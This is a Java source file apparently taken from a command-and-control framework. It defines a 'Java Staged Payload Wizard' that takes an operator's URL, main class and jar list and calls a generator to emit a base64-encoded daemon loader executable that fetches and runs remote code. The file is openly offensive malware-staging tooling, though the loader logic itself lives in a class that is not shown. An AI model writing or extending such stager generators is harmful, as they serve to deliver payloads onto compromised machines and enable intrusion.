package c2.session.wizard;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;

import c2.java.DaemonLoaderGenerator;

public class JavaStagerWizard implements Wizard {

	public static String CMD_GENERATE_JAVA = "generate_java";
	
	@Override
	public void init(Properties properties) {
		
	}

	@Override
	public String getHumanReadableName() {
		return "Java Staged Payload Wizard";
	}

	@Override
	public String getInvocationName() {
		return CMD_GENERATE_JAVA;
	}

	@Override
	public void surrenderControlFlow(OutputStreamWriter bw, BufferedReader br) throws IOException{
		bw.write(JavaStagerWizard.CMD_GENERATE_JAVA + " <url (ex: localhost:8010)> <Main Class name (ex HelloWorld)> <List of jar files to load> " + System.lineSeparator());
		bw.flush();
		String nextCommand = br.readLine();
		String args[] = nextCommand.split(" ");
		if(args.length < 4) {
			bw.write("Command requires at least one jar file" + System.lineSeparator());
			bw.flush();
		}
		List<String> jars = new ArrayList<>();
		for(int i = 3; i < args.length; i++) {
			jars.add(args[i]);
		}
		bw.write("<control> " + JavaStagerWizard.CMD_GENERATE_JAVA + " " + DaemonLoaderGenerator.generateDaemonLoaderB64Exe(args[1], jars, args[2]) + System.lineSeparator());
		bw.flush();
	}

}
